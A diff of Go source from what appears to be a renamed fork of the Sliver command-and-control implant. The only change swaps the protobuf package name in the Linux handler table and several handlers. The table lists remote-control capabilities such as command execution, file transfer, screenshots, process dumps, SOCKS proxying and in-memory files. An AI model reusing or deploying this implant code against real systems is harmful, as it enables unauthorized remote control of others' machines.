@@ -33,7 +33,7 @@ import (
 
 	"github.com/starkzarn/glod/implant/sliver/taskrunner"
 	"github.com/starkzarn/glod/protobuf/commonpb"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 	"google.golang.org/protobuf/proto"
 
 	// {{if .Config.Debug}}
@@ -43,51 +43,51 @@ import (
 
 var (
 	linuxHandlers = map[uint32]RPCHandler{
-		sliverpb.MsgPsReq:        psHandler,
-		sliverpb.MsgTerminateReq: terminateHandler,
-		sliverpb.MsgPing:         pingHandler,
-		sliverpb.MsgLsReq:        dirListHandler,
-		sliverpb.MsgDownloadReq:  downloadHandler,
-		sliverpb.MsgUploadReq:    uploadHandler,
-		sliverpb.MsgCdReq:        cdHandler,
-		sliverpb.MsgPwdReq:       pwdHandler,
-		sliverpb.MsgRmReq:        rmHandler,
-		sliverpb.MsgMkdirReq:     mkdirHandler,
-		sliverpb.MsgMvReq:        mvHandler,
-		sliverpb.MsgTaskReq:      taskHandler,
-		sliverpb.MsgIfconfigReq:  ifconfigHandler,
-		sliverpb.MsgExecuteReq:   executeHandler,
-		sliverpb.MsgEnvReq:       getEnvHandler,
-		sliverpb.MsgSetEnvReq:    setEnvHandler,
-		sliverpb.MsgUnsetEnvReq:  unsetEnvHandler,
+		glodpb.MsgPsReq:        psHandler,
+		glodpb.MsgTerminateReq: terminateHandler,
+		glodpb.MsgPing:         pingHandler,
+		glodpb.MsgLsReq:        dirListHandler,
+		glodpb.MsgDownloadReq:  downloadHandler,
+		glodpb.MsgUploadReq:    uploadHandler,
+		glodpb.MsgCdReq:        cdHandler,
+		glodpb.MsgPwdReq:       pwdHandler,
+		glodpb.MsgRmReq:        rmHandler,
+		glodpb.MsgMkdirReq:     mkdirHandler,
+		glodpb.MsgMvReq:        mvHandler,
+		glodpb.MsgTaskReq:      taskHandler,
+		glodpb.MsgIfconfigReq:  ifconfigHandler,
+		glodpb.MsgExecuteReq:   executeHandler,
+		glodpb.MsgEnvReq:       getEnvHandler,
+		glodpb.MsgSetEnvReq:    setEnvHandler,
+		glodpb.MsgUnsetEnvReq:  unsetEnvHandler,
 
-		sliverpb.MsgScreenshotReq: screenshotHandler,
+		glodpb.MsgScreenshotReq: screenshotHandler,
 
-		sliverpb.MsgNetstatReq:  netstatHandler,
-		sliverpb.MsgSideloadReq: sideloadHandler,
+		glodpb.MsgNetstatReq:  netstatHandler,
+		glodpb.MsgSideloadReq: sideloadHandler,
 
-		sliverpb.MsgReconfigureReq: reconfigureHandler,
-		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
-		sliverpb.MsgProcessDumpReq: dumpHandler,
+		glodpb.MsgReconfigureReq: reconfigureHandler,
+		glodpb.MsgSSHCommandReq:  runSSHCommandHandler,
+		glodpb.MsgProcessDumpReq: dumpHandler,
 
 		// {{if .Config.WGc2Enabled}}
 		// Wireguard specific
-		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
-		sliverpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
-		sliverpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
-		sliverpb.MsgWGStartSocksReq:     wgStartSocksHandler,
-		sliverpb.MsgWGStopSocksReq:      wgStopSocksHandler,
-		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
+		glodpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
+		glodpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
+		glodpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
+		glodpb.MsgWGStartSocksReq:     wgStartSocksHandler,
+		glodpb.MsgWGStopSocksReq:      wgStopSocksHandler,
+		glodpb.MsgWGListSocksReq:      wgListSocksServersHandler,
 		// {{end}}
 
 		// Linux Only
-		sliverpb.MsgChmodReq:   chmodHandler,
-		sliverpb.MsgChownReq:   chownHandler,
-		sliverpb.MsgChtimesReq: chtimesHandler,
+		glodpb.MsgChmodReq:   chmodHandler,
+		glodpb.MsgChownReq:   chownHandler,
+		glodpb.MsgChtimesReq: chtimesHandler,
 
-		sliverpb.MsgMemfilesListReq: memfilesListHandler,
-		sliverpb.MsgMemfilesAddReq:  memfilesAddHandler,
-		sliverpb.MsgMemfilesRmReq:   memfilesRmHandler,
+		glodpb.MsgMemfilesListReq: memfilesListHandler,
+		glodpb.MsgMemfilesAddReq:  memfilesAddHandler,
+		glodpb.MsgMemfilesRmReq:   memfilesRmHandler,
 	}
 )
 
@@ -124,20 +124,20 @@ func memfilesListHandler(data []byte, resp RPCResponse) {
 
 	// Convert directory listing to protobuf
 	timezone, offset := time.Now().Zone()
-	dirList := &sliverpb.Ls{Path: dir, Timezone: timezone, TimezoneOffset: int32(offset)}
+	dirList := &glodpb.Ls{Path: dir, Timezone: timezone, TimezoneOffset: int32(offset)}
 	if err == nil {
 		dirList.Exists = true
 	} else {
 		dirList.Exists = false
 	}
-	dirList.Files = []*sliverpb.FileInfo{}
+	dirList.Files = []*glodpb.FileInfo{}
 
 	for _, dirEntry := range files {
 		//log.Printf("File: %s\n", dirEntry.Name())
 		dirEntry.Name()
 
 		fileInfo, err := dirEntry.Info()
-		sliverFileInfo := &sliverpb.FileInfo{}
+		sliverFileInfo := &glodpb.FileInfo{}
 		if err == nil {
 
 			sliverFileInfo.Size = fileInfo.Size()
@@ -170,7 +170,7 @@ func memfilesListHandler(data []byte, resp RPCResponse) {
 func memfilesAddHandler(data []byte, resp RPCResponse) {
 
 	var nrMemfdCreate int
-	memfilesAdd := &sliverpb.MemfilesAdd{}
+	memfilesAdd := &glodpb.MemfilesAdd{}
 	memfilesAdd.Response = &commonpb.Response{}
 
 	memfdName := taskrunner.RandomString(8)
@@ -202,7 +202,7 @@ func memfilesAddHandler(data []byte, resp RPCResponse) {
 
 func memfilesRmHandler(data []byte, resp RPCResponse) {
 
-	memfilesRmReq := &sliverpb.MemfilesRmReq{}
+	memfilesRmReq := &glodpb.MemfilesRmReq{}
 	err := proto.Unmarshal(data, memfilesRmReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -211,7 +211,7 @@ func memfilesRmHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	memfilesRm := &sliverpb.MemfilesRm{}
+	memfilesRm := &glodpb.MemfilesRm{}
 	memfilesRm.Fd = memfilesRmReq.Fd
 	memfilesRm.Response = &commonpb.Response{}
 
@@ -241,7 +241,7 @@ func memfilesRmHandler(data []byte, resp RPCResponse) {
 }
 
 func chmodHandler(data []byte, resp RPCResponse) {
-	chmodReq := &sliverpb.ChmodReq{}
+	chmodReq := &glodpb.ChmodReq{}
 	err := proto.Unmarshal(data, chmodReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -250,7 +250,7 @@ func chmodHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	chmod := &sliverpb.Chmod{}
+	chmod := &glodpb.Chmod{}
 	target, _ := filepath.Abs(chmodReq.Path)
 	chmod.Path = target
 	// Make sure file exists
@@ -325,7 +325,7 @@ func chownHandler(data []byte, resp RPCResponse) {
 	var usr *user.User
 	var grp *user.Group
 
-	chownReq := &sliverpb.ChownReq{}
+	chownReq := &glodpb.ChownReq{}
 	err = proto.Unmarshal(data, chownReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -334,7 +334,7 @@ func chownHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	chown := &sliverpb.Chown{}
+	chown := &glodpb.Chown{}
 	target, _ := filepath.Abs(chownReq.Path)
 	chown.Path = target
 	_, err = os.Stat(target)
